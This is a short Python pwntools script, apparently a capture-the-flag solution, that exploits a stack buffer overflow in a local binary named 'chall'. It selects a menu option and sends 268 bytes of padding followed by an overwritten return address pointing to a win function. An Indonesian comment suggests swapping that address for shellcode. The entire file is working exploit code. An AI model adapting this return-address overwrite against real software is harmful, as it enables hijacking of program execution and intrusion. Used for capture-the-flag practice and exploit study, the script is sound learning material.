from pwn import *

p = process("./chall")

win_func = 0x004011e6

p.recvuntil(b"choice:")
p.sendline(b"1")
p.recvuntil(b"ers):")

payload = b"A" * 256 #buffer
payload += b"B" * 0xc #buffer
payload += p64(0x004011e6)  # Return address (ubah ke alamat shellcode)

print(payload)
p.sendline(payload)

print(p.recv().decode())
print(p.recv().decode())
#print(p.recvall())

# p.interactive()
